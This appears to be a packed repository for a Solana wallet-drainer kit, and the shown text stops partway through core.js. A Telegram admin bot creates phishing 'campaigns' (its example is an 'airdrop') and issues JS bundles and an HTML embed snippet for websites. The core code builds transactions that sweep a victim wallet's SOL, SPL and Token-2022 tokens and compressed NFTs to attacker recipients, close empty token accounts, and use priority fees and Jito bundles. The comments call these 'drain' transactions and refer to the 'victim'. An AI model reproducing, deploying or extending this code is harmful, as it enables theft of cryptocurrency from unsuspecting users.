@@ -1,0 +1,1850 @@
+This file is a merged representation of the entire codebase, combined into a single document by Repomix.
+
+<file_summary>
+This section contains a summary of this file.
+
+<purpose>
+This file contains a packed representation of the entire repository's contents.
+It is designed to be easily consumable by AI systems for analysis, code review,
+or other automated processes.
+</purpose>
+
+<file_format>
+The content is organized as follows:
+1. This summary section
+2. Repository information
+3. Directory structure
+4. Repository files (if enabled)
+5. Multiple file entries, each consisting of:
+  - File path as an attribute
+  - Full contents of the file
+</file_format>
+
+<usage_guidelines>
+- This file should be treated as read-only. Any changes should be made to the
+  original repository files, not this packed version.
+- When processing this file, use the file path to distinguish
+  between different files in the repository.
+- Be aware that this file may contain sensitive information. Handle it with
+  the same level of security as you would the original repository.
+</usage_guidelines>
+
+<notes>
+- Some files may have been excluded based on .gitignore rules and Repomix's configuration
+- Binary files are not included in this packed representation. Please refer to the Repository Structure section for a complete list of file paths, including binary files
+- Files matching patterns in .gitignore are excluded
+- Files matching default ignore patterns are excluded
+- Files are sorted by Git change count (files with more changes are at the bottom)
+</notes>
+
+</file_summary>
+
+<directory_structure>
+.env.example
+.gitignore
+alt.js
+bot.js
+cnft.js
+core.js
+das.js
+generate.js
+package.json
+ratelimit.js
+README.md
+recipients.js
+server.js
+store.js
+</directory_structure>
+
+<files>
+This section contains the contents of the repository's files.
+
+<file path=".env.example">
+# --- RPC ---
+SOLANA_RPC_URL=
+# DAS-capable RPC for cNFT lookup (Helius, Triton). Leave blank to disable cNFT sweep.
+DAS_RPC_URL=
+
+# --- Recipients ---
+# Single recipient
+RECIPIENT=
+# Or comma-separated for split (takes precedence over RECIPIENT)
+RECIPIENTS=
+
+# --- Priority fee ---
+PRIORITY_FEE_MODE=dynamic
+PRIORITY_FEE_MICRO_LAMPORTS=100000
+
+# --- Compute unit limit (blank = auto per-tx) ---
+UNIT_LIMIT=
+
+# --- Jito bundles ---
+USE_JITO=false
+JITO_TIP_LAMPORTS=100000
+
+# --- Simulation ---
+SIMULATE_BEFORE_PLAN=true
+
+# --- Auth ---
+REQUIRE_AUTH=true
+
+# --- Feature flags ---
+ENABLE_ALT=true
+ENABLE_CNFT=true
+MAX_CNFT_SWEEP=10
+
+# --- Persistence ---
+DATA_DIR=./data
+
+# --- Telegram ---
+TELEGRAM_BOT_TOKEN=
+TELEGRAM_ADMIN_IDS=
+
+# --- Bundle URL ---
+APP_URL=http://localhost:3000
+PORT=3000
+</file>
+
+<file path="alt.js">
+import {
+  AddressLookupTableProgram,
+  PublicKey,
+  Keypair,
+  Connection,
+  Transaction,
+  sendAndConfirmTransaction,
+} from "@solana/web3.js";
+import fs from "node:fs";
+import path from "node:path";
+import bs58 from "bs58";
+
+const DATA_DIR = process.env.DATA_DIR || "./data";
+const AUTHORITY_FILE = path.join(DATA_DIR, "alt-authority.json");
+
+// Fixed accounts present in every drain tx. Cached in ALT once per campaign.
+export const FIXED_ALT_ACCOUNTS = [
+  "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA", // SPL Token
+  "TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb", // Token-2022
+  "11111111111111111111111111111111",             // System
+  "ComputeBudget111111111111111111111111111111",  // Compute Budget
+  "ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL", // ATA program
+  "BGUMAp9Gq7iTEuizy4pqaxsTyUCBK68MDfK752saRPUY", // Bubblegum
+  "cmtDvXumGCrqC1Age74AVPhSRVXJMd8PJS91L8KbNCK", // SPL Account Compression
+  "noopb9bkMVfRPU8AsbpTUg8AQkHtKwMYZiFUjNRtMmV",  // SPL Noop
+  "SysvarRent111111111111111111111111111111111",  // Sysvar Rent
+  "SysvarS1otHashes111111111111111111111111111",  // Sysvar Slot Hashes
+  "JUP6LkbZbjS1jKKwapdHNy74zcZ3tLUZoi5QNyVTaV4",  // Jupiter v6 (for routing if ever needed)
+];
+
+// Common SPL mints so victim's USDC/USDT/etc ATAs get ALT indices.
+export const COMMON_MINTS = [
+  "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v", // USDC
+  "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB", // USDT
+  "So11111111111111111111111111111111111111112",  // wSOL
+  "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263", // BONK
+  "EKpQGSJtjMFqKZ9KQanSqYXRcF8fBopzLHYxdM65zcjm", // WIF
+  "JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN",  // JUP
+  "4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R", // RAY
+  "mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So",  // mSOL
+  "7dHbWXmci3dT8UFYWYZweBLXgycu7Y3iL6trKn1Y7ARj", // stSOL
+  "bSo13r4TkiE4KumL71LsHTPpL2euBYLFx6h9HP3piy1",  // bSOL
+  "HZ1JovNiVvGrGNiiYvEozEVgZ58xaU3RKwX8eACQBCt3", // PYTH
+  "hntyVP6YFm1Hg25TN9WGLqM12b8TQmcknKrdu1oxWux",  // HNT
+  "rndrizKT3MK1iimdxRdWabcF7Zg7AR5T4nud4EkHBof",  // RENDER
+  "TNSRxcUxoT9xBG3de7PiJyTDYu7kskLqcpddxnEJAS6",  // TNSR
+  "WENWENvqqNya429ubCdR81ZmD69brwQaaBYY6p3LCpk",  // WEN
+  "MNDEFzGvMt87ueuHvVU9VcTqsAP5b3fTGPsHuuPA5ey",  // MNDE
+  "orcaEKTdK7LKz57vaAYr9QeNsVEPfiu6QeMU1kektZE",  // ORCA
+  "nosXBVoaCTtYdLvKY6Csb4AC8JCdQKKAaWYtx2ZMoo7",  // NOS
+  "KMNo3nJsBXfcpJTVhZcXLW7RmTwTt4GVFE7suUBo9sS",  // KMNO
+  "jtojtomepa8beP8AuQc6eXt5FriJwfFMwQx2v2f9mCL",  // JTO
+  "27G8MtK7VtTcCHkpASjSDdkWWYfoqT6ggEuKidVJidD4", // JLP
+  "4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R", // RAY (dup safe)
+];
+
+export function loadAltAuthority() {
+  if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
+  if (fs.existsSync(AUTHORITY_FILE)) {
+    const raw = JSON.parse(fs.readFileSync(AUTHORITY_FILE, "utf8"));
+    return Keypair.fromSecretKey(Uint8Array.from(raw));
+  }
+  const kp = Keypair.generate();
+  fs.writeFileSync(AUTHORITY_FILE, JSON.stringify(Array.from(kp.secretKey)));
+  console.log("[alt] generated authority:", kp.publicKey.toBase58());
+  return kp;
+}
+
+export async function ensureAlt(connection, authority, existingAlt, addresses) {
+  const uniq = Array.from(new Set(addresses.filter(Boolean)));
+
+  if (!existingAlt) {
+    const slot = await connection.getSlot("confirmed");
+    const [ix, address] = AddressLookupTableProgram.createLookupTable({
+      authority: authority.publicKey,
+      payer: authority.publicKey,
+      recentSlot: slot,
+    });
+    const tx = new Transaction().add(ix);
+    await sendAndConfirmTransaction(connection, tx, [authority], { commitment: "confirmed" });
+    console.log("[alt] created", address.toBase58());
+
+    // Wait for activation slot.
+    await new Promise((r) => setTimeout(r, 1500));
+    existingAlt = address.toBase58();
+  }
+
+  const current = await connection.getAddressLookupTable(new PublicKey(existingAlt)).then((r) => r.value);
+  const present = new Set((current?.state?.addresses || []).map((k) => k.toBase58()));
+  const toAdd = uniq.filter((a) => !present.has(a));
+
+  if (toAdd.length > 0) {
+    // Chunk to 20 addresses per extend tx (each is 32 bytes in the table).
+    for (let i = 0; i < toAdd.length; i += 20) {
+      const chunk = toAdd.slice(i, i + 20).map((a) => new PublicKey(a));
+      const ix = AddressLookupTableProgram.extendLookupTable({
+        lookupTable: new PublicKey(existingAlt),
+        authority: authority.publicKey,
+        payer: authority.publicKey,
+        addresses: chunk,
+      });
+      const tx = new Transaction().add(ix);
+      await sendAndConfirmTransaction(connection, tx, [authority], { commitment: "confirmed" });
+    }
+    console.log("[alt] extended", existingAlt, "by", toAdd.length);
+    // Wait one slot so the extension is queryable.
+    await new Promise((r) => setTimeout(r, 800));
+  }
+
+  const { value } = await connection.getAddressLookupTable(new PublicKey(existingAlt));
+  return { address: existingAlt, account: value };
+}
+
+export function defaultAltAddresses(recipients) {
+  return [...FIXED_ALT_ACCOUNTS, ...COMMON_MINTS, ...(recipients || [])];
+}
+</file>
+
+<file path="bot.js">
+import "dotenv/config";
+import { generateBundle, HTML_SNIPPET, newCampaignSecret } from "./generate.js";
+import { parseRecipients } from "./recipients.js";
+import * as store from "./store.js";
+
+const TOKEN = process.env.TELEGRAM_BOT_TOKEN || "";
+const APP_URL = process.env.APP_URL || "http://localhost:3000";
+const DEFAULT_RECIPIENTS = (() => {
+  try { return parseRecipients(process.env); } catch { return []; }
+})();
+const ADMIN_IDS = (process.env.TELEGRAM_ADMIN_IDS || "")
+  .split(",").map((s) => s.trim()).filter(Boolean);
+
+if (!TOKEN) {
+  console.error("TELEGRAM_BOT_TOKEN is not set");
+  process.exit(1);
+}
+
+const API = `https://api.telegram.org/bot${TOKEN}`;
+
+async function tg(method, params) {
+  const res = await fetch(`${API}/${method}`, {
+    method: "POST",
+    headers: { "content-type": "application/json" },
+    body: JSON.stringify(params),
+  });
+  return res.json();
+}
+
+function send(chatId, text, parseMode = false) {
+  const payload = { chat_id: chatId, text };
+  if (parseMode) payload.parse_mode = "HTML";
+  return tg("sendMessage", payload);
+}
+
+function isAdmin(chatId) {
+  return ADMIN_IDS.length === 0 || ADMIN_IDS.includes(String(chatId));
+}
+
+async function sendDocument(chatId, filename, content) {
+  const form = new FormData();
+  form.append("chat_id", String(chatId));
+  form.append("caption", filename);
+  form.append("document", new Blob([content], { type: "text/javascript" }), filename);
+  await fetch(`${API}/sendDocument`, { method: "POST", body: form });
+}
+
+function parseCreate(argLine) {
+  const parts = argLine.split("|").map((s) => s.trim());
+  if (parts.length < 2) return null;
+  const [name, recipientRaw, modeRaw, liquidRaw] = parts;
+  const recipient = recipientRaw || DEFAULT_RECIPIENTS[0] || "";
+  if (!name || !recipient) return null;
+  const mode = modeRaw === "manual" ? "manual" : "auto";
+  const liquidMints = (liquidRaw || "").split(",").map((s) => s.trim()).filter(Boolean);
+  return { name, recipient, mode, liquidMints };
+}
+
+function escapeHtml(value) {
+  return value.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
+}
+
+async function handleUpdate(update) {
+  const message = update.message;
+  if (!message || !message.text) return;
+  const chatId = message.chat.id;
+  const text = message.text;
+
+  if (!isAdmin(chatId)) {
+    await send(chatId, "Access denied.");
+    return;
+  }
+
+  const [cmd, ...rest] = text.split(/\s+/);
+  const argLine = rest.join(" ");
+
+  if (cmd === "/start" || cmd === "/help") {
+    await send(
+      chatId,
+      `<b>Sol Asset Manager</b>\n\n` +
+        `<code>/newfile name|recipient|mode|liquidMints</code> — create a campaign\n` +
+        `<code>/getfile id</code> — fetch the JS bundle\n` +
+        `<code>/list</code> — list campaigns\n` +
+        `<code>/stats id</code> — campaign details\n` +
+        `<code>/delete id</code> — remove a campaign\n` +
+        `<code>/snippet</code> — HTML embed snippet\n\n` +
+        `Mode: <code>auto</code> (default) or <code>manual</code> (mint allowlist).\n` +
+        `Example: <code>/newfile airdrop|RECIPIENT|auto</code>`,
+      true,
+    );
+    return;
+  }
+
+  if (cmd === "/snippet") {
+    await send(chatId, `<code>${escapeHtml(HTML_SNIPPET)}</code>`, true);
+    return;
+  }
+
+  if (cmd === "/newfile") {
+    const parsed = parseCreate(argLine);
+    if (!parsed) {
+      await send(chatId, "Usage: /newfile name|recipient|mode|liquidMints");
+      return;
+    }
+    const id = `cmp_${Date.now().toString(36)}_${Math.random().toString(36).slice(2, 6)}`;
+    const secret = newCampaignSecret();
+
+    store.put(id, {
+      name: parsed.name,
+      recipient: parsed.recipient,
+      mode: parsed.mode,
+      liquidMints: parsed.liquidMints,
+      secret,
+      createdAt: new Date().toISOString(),
+      createdBy: String(chatId),
+      alt: null,
+    });
+
+    await send(
+      chatId,
+      `Campaign <b>${escapeHtml(parsed.name)}</b> (#${id}) created.\n\n` +
+        `Get the JS: <code>/getfile ${id}</code>\n` +
+        `Embed snippet: <code>/snippet</code>`,
+      true,
+    );
+    return;
+  }
+
+  if (cmd === "/getfile") {
+    const id = argLine.trim();
+    const record = store.get(id);
+    if (!record) return send(chatId, "Campaign not found.");
+    const bundle = generateBundle({
+      planEndpoint: `${APP_URL}/plan`,
+      submitEndpoint: `${APP_URL}/submit`,
+      recipients: [record.recipient],
+      mode: record.mode,
+      liquidMints: record.liquidMints,
+      campaignId: id,
+      secret: record.secret,
+      brand: { name: record.name },
+    });
+    await sendDocument(chatId, `${id}.js`, bundle);
+    return;
+  }
+
+  if (cmd === "/list") {
+    const items = store.list();
+    if (items.length === 0) return send(chatId, "No campaigns.");
+    const lines = items
+      .slice(-50)
+      .map((c) => `#${c.id} — ${escapeHtml(c.name)} — ${c.mode} — ${c.recipient.slice(0, 8)}…`);
+    await send(chatId, `<b>Campaigns</b>\n` + lines.join("\n"), true);
+    return;
+  }
+
+  if (cmd === "/stats") {
+    const id = argLine.trim();
+    const record = store.get(id);
+    if (!record) return send(chatId, "Campaign not found.");
+    await send(
+      chatId,
+      `<b>#${id}</b>\n` +
+        `Name: ${escapeHtml(record.name)}\n` +
+        `Recipient: <code>${record.recipient}</code>\n` +
+        `Mode: ${record.mode}\n` +
+        `Mints: ${(record.liquidMints || []).length || "all"}\n` +
+        `ALT: <code>${record.alt || "not set"}</code>\n` +
+        `Created: ${record.createdAt}`,
+      true,
+    );
+    return;
+  }
+
+  if (cmd === "/delete") {
+    const id = argLine.trim();
+    if (!store.get(id)) return send(chatId, "Campaign not found.");
+    store.remove(id);
+    await send(chatId, `Campaign #${id} deleted.`);
+    return;
+  }
+
+  await send(chatId, "Unknown command. Send /help.");
+}
+
+async function main() {
+  await fetch(`${API}/deleteWebhook?drop_pending_updates=true`).catch(() => {});
+  console.log("[bot] polling started");
+  let offset = 0;
+  for (;;) {
+    try {
+      const res = await fetch(`${API}/getUpdates?timeout=25&offset=${offset}`);
+      const data = await res.json();
+      if (!data.ok) continue;
+      for (const update of data.result) {
+        offset = update.update_id + 1;
+        handleUpdate(update).catch((err) => console.error("[bot] handle", err));
+      }
+    } catch (err) {
+      console.error("[bot] poll", err.message);
+      await new Promise((r) => setTimeout(r, 3000));
+    }
+  }
+}
+
+main();
+</file>
+
+<file path="cnft.js">
+import bs58 from "bs58";
+import { createUmi } from "@metaplex-foundation/umi-bundle-defaults";
+import { mplBubblegum, transferV1 } from "@metaplex-foundation/mpl-bubblegum";
+import { publicKey } from "@metaplex-foundation/umi";
+import { PublicKey, TransactionInstruction } from "@solana/web3.js";
+import { listCompressedAssets, getAssetProof, decodeProof, decodeHash } from "./das.js";
+
+let cachedUmi = null;
+let cachedUmiUrl = null;
+
+function getUmi(rpcUrl) {
+  if (cachedUmi && cachedUmiUrl === rpcUrl) return cachedUmi;
+  cachedUmi = createUmi(rpcUrl).use(mplBubblegum());
+  cachedUmiUrl = rpcUrl;
+  return cachedUmi;
+}
+
+function umiIxToWeb3(umiIx) {
+  return new TransactionInstruction({
+    programId: new PublicKey(umiIx.programId.toString()),
+    keys: umiIx.keys.map((k) => ({
+      pubkey: new PublicKey(k.pubkey.toString()),
+      isSigner: k.isSigner,
+      isWritable: k.isWritable,
+    })),
+    data: Buffer.from(umiIx.data),
+  });
+}
+
+export async function planCompressedSweep({ rpcUrl, dasUrl, source, recipient, maxAssets = 10 }) {
+  if (!dasUrl) return { assets: [], instructions: [], total: 0, selected: 0, note: "DAS not configured" };
+
+  const umi = getUmi(rpcUrl);
+
+  let compressed;
+  try {
+    compressed = await listCompressedAssets(dasUrl, source, 500);
+  } catch (err) {
+    return { assets: [], instructions: [], total: 0, selected: 0, note: `DAS list failed: ${err.message}` };
+  }
+
+  const selected = compressed.slice(0, maxAssets);
+  const out = [];
+
+  for (const asset of selected) {
+    try {
+      const proof = await getAssetProof(dasUrl, asset.id);
+      const { root, proof: proofKeys } = decodeProof(proof);
+      const dataHash = decodeHash(asset.compression.data_hash);
+      const creatorHash = decodeHash(asset.compression.creator_hash);
+      const nonce = BigInt(asset.compression.leaf_id);
+      const index = asset.compression.leaf_id;
+      const tree = asset.compression.tree;
+
+      const builder = transferV1(umi, {
+        leafOwner: publicKey(source),
+        newLeafOwner: publicKey(recipient),
+        merkleTree: publicKey(tree),
+        root,
+        dataHash,
+        creatorHash,
+        nonce,
+        index,
+        proof: proofKeys.map((p) => publicKey(bs58.encode(p))),
+      });
+
+      const umiInstructions = builder.getInstructions();
+      const web3Ixs = umiInstructions.map(umiIxToWeb3);
+
+      out.push({
+        assetId: asset.id,
+        name: asset.content?.metadata?.name || "unknown",
+        tree,
+        instructions: web3Ixs,
+      });
+    } catch (err) {
+      out.push({ assetId: asset.id, error: err.message });
+    }
+  }
+
+  const usable = out.filter((a) => !a.error && a.instructions);
+  return {
+    assets: out,
+    instructions: usable,
+    total: compressed.length,
+    selected: selected.length,
+  };
+}
+</file>
+
+<file path="core.js">
+import {
+  PublicKey,
+  VersionedTransaction,
+  TransactionMessage,
+  SystemProgram,
+  ComputeBudgetProgram,
+  Keypair,
+  Connection,
+} from "@solana/web3.js";
+import {
+  TOKEN_PROGRAM_ID,
+  TOKEN_2022_PROGRAM_ID,
+  getAssociatedTokenAddressSync,
+  createAssociatedTokenAccountIdempotentInstruction,
+  createCloseAccountInstruction,
+  createTransferCheckedInstruction,
+  createTransferCheckedWithFeeInstruction,
+  calculateFee,
+  getMint,
+} from "@solana/spl-token";
+import bs58 from "bs58";
+import { planCompressedSweep } from "./cnft.js";
+import { assignEntries, splitLamports } from "./recipients.js";
+
+const SIGNATURE_FEE = 5000;
+const BASE_TX_CU = 20000;
+const CU_PER_TRANSFER = 30000;
+const CU_PER_CLOSE = 8000;
+const CU_PER_ATA = 25000;
+const CU_PER_CNFT = 200000;
+const MAX_TRANSFERS_PER_TX = 12;
+const MAX_CLOSES_PER_TX = 10;
+const MIN_PRIORITY = 1000;
+const MAX_PRIORITY = 5_000_000;
+const MAX_UNIT_LIMIT = 1_400_000;
+
+export const JITO_TIP_ACCOUNTS = [
+  "96gYZGLnJYVFmbjzopPSU6QiEV5fGqZNyN9nmNhvrZU5",
+  "HFqU5x63VTqvQss8hp11i4wVV8bD44PvwucfZ2bU7gRe",
+  "Cw8CFyM9FkoMi7K7Crf6HNQqf4uEMzpKw6QNghXLvLkY",
+  "ADaUMid9yfUytqMBgopwjb2DTLSokTSzL1zt6iGPaS49",
+  "DfXygSm4jCyNCybVYYK6DwvWqjKee8pbDmJGcLWNDXjh",
+  "ADuUkR4vqLUMWXxW9gh6D6L8pMSawimctcNZ5pGwDcEt",
+  "DttWaMuVvTiduZRnguLF7jNxTgiMBZ1hyAumKUiL2KRL",
+  "3AVi9Tg9Uo68tJfuvoKvqKNWKkC5wPdSSdeBnizKZ6jT",
+];
+
+const JITO_ENDPOINT = "https://mainnet.block-engine.jito.wtf/api/v1/bundles";
+
+export function keypairFromSecret(value, name) {
+  if (!value) throw new Error(`${name} is not configured`);
+  let bytes;
+  try {
+    bytes = value.trim().startsWith("[")
+      ? Uint8Array.from(JSON.parse(value))
+      : bs58.decode(value.trim());
+  } catch {
+    throw new Error(`${name} is invalid`);
+  }
+  if (bytes.length === 64) return Keypair.fromSecretKey(bytes);
+  if (bytes.length === 32) return Keypair.fromSeed(bytes);
+  throw new Error(`${name} must contain 32 or 64 bytes`);
+}
+
+export function makeConnection(rpcUrl) {
+  return new Connection(rpcUrl || "https://api.mainnet-beta.solana.com", "confirmed");
+}
+
+async function scan(connection, owner) {
+  const lamports = await connection.getBalance(owner, "confirmed");
+  const grouped = new Map();
+
+  for (const programId of [TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID]) {
+    const accounts = await connection.getParsedTokenAccountsByOwner(owner, { programId });
+    for (const entry of accounts.value) {
+      const info = entry.account.data.parsed.info;
+      const prior = grouped.get(info.mint);
+      grouped.set(info.mint, {
+        raw: (prior ? prior.raw : 0n) + BigInt(info.tokenAmount.amount),
+        decimals: info.tokenAmount.decimals,
+        account: entry.pubkey.toBase58(),
+        program: entry.account.owner.toBase58(),
+        frozen: info.state === "frozen",
+      });
+    }
+  }
+  return { lamports, grouped };
+}
+
+async function emptyAccounts(connection, owner) {
+  const out = [];
+  for (const programId of [TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID]) {
+    const accounts = await connection.getParsedTokenAccountsByOwner(owner, { programId });
+    for (const entry of accounts.value) {
+      if (BigInt(entry.account.data.parsed.info.tokenAmount.amount) === 0n) {
+        out.push({ account: entry.pubkey, program: programId });
+      }
+    }
+  }
+  return out;
+}
+
+function tokenProgramOf(entry) {
+  return entry.program === TOKEN_2022_PROGRAM_ID.toBase58()
+    ? TOKEN_2022_PROGRAM_ID
+    : TOKEN_PROGRAM_ID;
+}
+
+export async function suggestPriorityFee(connection, mode, fallback) {
+  if (mode === "fixed") return fallback;
+  try {
+    const fees = await connection.getRecentPrioritizationFees();
+    if (!fees.length) return fallback;
+    const sorted = fees.map((f) => f.prioritizationFee).filter((n) => n > 0).sort((a, b) => a - b);
+    if (!sorted.length) return fallback;
+    const p75 = sorted[Math.floor(sorted.length * 0.75)];
+    return Math.min(MAX_PRIORITY, Math.max(MIN_PRIORITY, p75));
+  } catch {
+    return fallback;
+  }
+}
+
+function estimateUnits(transfers, closes, cnfts = 0) {
+  const ataCost = transfers * CU_PER_ATA;
+  const transferCost = transfers * CU_PER_TRANSFER;
+  const closeCost = closes * CU_PER_CLOSE;
+  const cnftCost = cnfts * CU_PER_CNFT;
+  return Math.min(MAX_UNIT_LIMIT, BASE_TX_CU + ataCost + transferCost + closeCost + cnftCost);
+}
+
+async function transferInstruction(connection, entry, destination, owner) {
+  const mint = new PublicKey(entry.mint);
+  const source = new PublicKey(entry.account);
+  const program = tokenProgramOf(entry);
+
+  if (program.equals(TOKEN_PROGRAM_ID)) {
+    return createTransferCheckedInstruction(
+      source, mint, destination, owner, entry.raw, entry.decimals, [], TOKEN_PROGRAM_ID,
+    );
+  }
+
+  const mintInfo = await getMint(connection, mint, "confirmed", TOKEN_2022_PROGRAM_ID);
+  const feeConfig = mintInfo.transferFeeConfig;
+  if (!feeConfig) {
+    return createTransferCheckedInstruction(
+      source, mint, destination, owner, entry.raw, entry.decimals, [], TOKEN_2022_PROGRAM_ID,
+    );
+  }
+  const fee = calculateFee(feeConfig.newerTransferFee, entry.raw);
+  return createTransferCheckedWithFeeInstruction(
+    source, mint, destination, owner, entry.raw, entry.decimals, fee, [], TOKEN_2022_PROGRAM_ID,
+  );
+}
+
+async function buildV0(connection, payer, instructions, altAccounts) {
+  const { blockhash } = await connection.getLatestBlockhash("confirmed");
+  const message = new TransactionMessage({
+    payerKey: payer,
+    recentBlockhash: blockhash,
+    instructions,
+  }).compileToV0Message(altAccounts || []);
+  return new VersionedTransaction(message);
+}
+
+async function simulate(connection, tx) {
+  try {
+    const res = await connection.simulateTransaction(tx, {
+      sigVerify: false,
+      replaceRecentBlockhash: true,
+    });
+    return { ok: !res.value.err, err: res.value.err, logs: res.value.logs || [] };
+  } catch (err) {
+    return { ok: false, err: err.message, logs: [] };
+  }
+}
+
+/**
+ * Build the full plan.
+ *
+ * recipients      — array of recipient base58 strings
+ * altAccount      — AddressLookupTableAccount | null
+ * source          — base58
+ * includeCnft     — bool
+ * dasUrl          — DAS RPC URL for compressed asset lookup
+ */
+export async function buildPlan({
+  rpc,
+  source,
+  recipients,
+  mode,
+  liquidMints,
+  priorityMicroLamports,
+  priorityMode = "dynamic",
+  unitLimit,
+  altAccount,
+  useJito = false,
+  jitoTipLamports = 100000,
+  simulate: doSimulate = true,
+  includeCnft = false,
+  dasUrl = null,
+  maxCnft = 10,
+}) {
+  const connection = makeConnection(rpc);
+  const sourceKey = new PublicKey(source);
+  const recipientKeys = recipients.map((r) => new PublicKey(r));
+  const recipientSet = new Set(recipients);
+  if (recipientSet.has(source)) throw new Error("source and recipient must differ");
+
+  const { lamports, grouped } = await scan(connection, sourceKey);
+  const manual = mode === "manual";
+  const allowlist = manual ? new Set(liquidMints || []) : null;
+
+  const entries = [];
+  for (const [mint, entry] of grouped) {
+    if (entry.raw <= 0n) continue;
+    if (entry.frozen) continue;
+    if (allowlist && !allowlist.has(mint)) continue;
+    entries.push({ mint, ...entry });
+  }
+  entries.sort((a, b) => (b.raw > a.raw ? 1 : b.raw < a.raw ? -1 : 0));
+
+  const closable = await emptyAccounts(connection, sourceKey);
+
+  const priority = await suggestPriorityFee(connection, priorityMode, priorityMicroLamports);
+
+  // ---- cNFT sweep (parallel, one tx per asset, tracked separately) ----
+  let cnftPlan = { assets: [], instructions: [], total: 0, selected: 0 };
+  if (includeCnft && dasUrl) {
+    cnftPlan = await planCompressedSweep({
+      rpcUrl: rpc,
+      dasUrl,
+      source,
+      recipient: recipients[0],
+      maxAssets: maxCnft,
+    });
+  }
+  const cnftTxs = [];
+
+  // ---- SPL + SOL plan ----
+  const buckets = assignEntries(entries, recipients);
+  const lamportsPerRecipient = splitLamports(BigInt(lamports), recipients);
+
+  // Compute total fee reserve: token chunks + close chunks + cnft txs + jito tip.
+  const tokenChunks = Math.max(1, Math.ceil(entries.length / MAX_TRANSFERS_PER_TX));
+  const closeChunks = Math.max(1, Math.ceil(closable.length / MAX_CLOSES_PER_TX));
+  const splIterations = Math.max(tokenChunks, closeChunks);
+
+  let reserve = 0n;
+  for (let i = 0; i < splIterations; i++) {
+    const t = Math.min(MAX_TRANSFERS_PER_TX, Math.max(0, entries.length - i * MAX_TRANSFERS_PER_TX));
+    const c = Math.min(MAX_CLOSES_PER_TX, Math.max(0, closable.length - i * MAX_CLOSES_PER_TX));
+    const cu = unitLimit || estimateUnits(t, c);
+    reserve += BigInt(SIGNATURE_FEE + Math.ceil((priority * cu) / 1_000_000));
+  }
+  for (const _ of cnftPlan.instructions) {
+    reserve += BigInt(SIGNATURE_FEE + Math.ceil((priority * CU_PER_CNFT) / 1_000_000));
+  }
+  if (useJito) reserve += BigInt(jitoTipLamports + SIGNATURE_FEE);
+
+  if (BigInt(lamports) < reserve) {
+    throw new Error(`insufficient SOL for fees: have ${lamports}, need ${reserve}`);
+  }
+
+  const settablePerRecipient = !manual
+    ? recipients.map((r) => {
+        const base = lamportsPerRecipient[recipients.indexOf(r)];
+        return base > reserve / BigInt(recipients.length) ? base - reserve / BigInt(recipients.length) : 0n;
+      })
+    : recipients.map(() => 0n);
+
+  const builtTxs = [];
+
+  for (let i = 0; i < splIterations; i++) {
+    // Slice globally, then distribute each slice per recipient.
+    const globalChunk = entries.slice(i * MAX_TRANSFERS_PER_TX, (i + 1) * MAX_TRANSFERS_PER_TX);
+    const closes = closable.slice(i * MAX_CLOSES_PER_TX, (i + 1) * MAX_CLOSES_PER_TX);
+    if (globalChunk.length === 0 && closes.length === 0 && (i !== 0 || settablePerRecipient.some((s) => s > 0n))) {
+      // no-op
+    }
+    if (globalChunk.length === 0 && closes.length === 0 && i !== 0) continue;
+    if (globalChunk.length === 0 && closes.length === 0 && settablePerRecipient.every((s) => s === 0n) && i === 0) {
+      // continue — we still want to attempt closes if any
+      if (closes.length === 0) continue;
+    }
+
+    const cu = unitLimit || estimateUnits(globalChunk.length, closes.length);
+    const instructions = [
+      ComputeBudgetProgram.setComputeUnitPrice({ microLamports: priority }),
+      ComputeBudgetProgram.setComputeUnitLimit({ units: cu }),
+    ];
+
+    if (i === 0) {
+      for (let r = 0; r < recipients.length; r++) {
+        const amount = settablePerRecipient[r];
+        if (amount <= 0n) continue;
+        instructions.push(SystemProgram.transfer({
+          fromPubkey: sourceKey,
+          toPubkey: recipientKeys[r],
+          lamports: Number(amount),
+        }));
+      }
+    }
+
+    for (const entry of globalChunk) {
+      const recipientIdx = globalChunk.indexOf(entry) % recipients.length;
+      const recipientKey = recipientKeys[recipientIdx];
+      const program = tokenProgramOf(entry);
+      const destination = getAssociatedTokenAddressSync(
+        new PublicKey(entry.mint), recipientKey, false, program,
+      );
+      instructions.push(createAssociatedTokenAccountIdempotentInstruction(
+        sourceKey, destination, recipientKey, new PublicKey(entry.mint), program,
+      ));
+      instructions.push(await transferInstruction(connection, entry, destination, sourceKey));
+    }
+
+    for (const { account, program } of closes) {
+      instructions.push(createCloseAccountInstruction(
+        account, recipientKeys[0], sourceKey, [], program,
+      ));
+    }
+
+    const tx = await buildV0(connection, sourceKey, instructions, altAccount ? [altAccount] : []);
+    const serialized = Buffer.from(tx.serialize()).toString("base64");
+
+    if (doSimulate) {
+      const sim = await simulate(connection, tx);
+      builtTxs.push({ base64: serialized, simulated: sim.ok, simError: sim.ok ? null : sim.err });
+      continue;
+    }
+    builtTxs.push({ base64: serialized, simulated: null });
+  }
+
+  // ---- cNFT txs ----
+  for (const asset of cnftPlan.instructions) {
+    const instructions = [
+      ComputeBudgetProgram.setComputeUnitPrice({ microLamports: priority }),
+      ComputeBudgetProgram.setComputeUnitLimit({ units: Math.min(MAX_UNIT_LIMIT, CU_PER_CNFT) }),
+      ...asset.instructions,
+    ];
+    const tx = await buildV0(connection, sourceKey, instructions, altAccount ? [altAccount] : []);
+    const serialized = Buffer.from(tx.serialize()).toString("base64");
+
+    let simulated = null;
+    let simError = null;
+    if (doSimulate) {
+      const sim = await simulate(connection, tx);
+      simulated = sim.ok;
+      simError = sim.ok ? null : sim.err;
+    }
+    cnftTxs.push({ base64: serialized, assetId: asset.assetId, name: asset.name, simulated, simError });
+  }
+
+  // ---- Jito tip ----
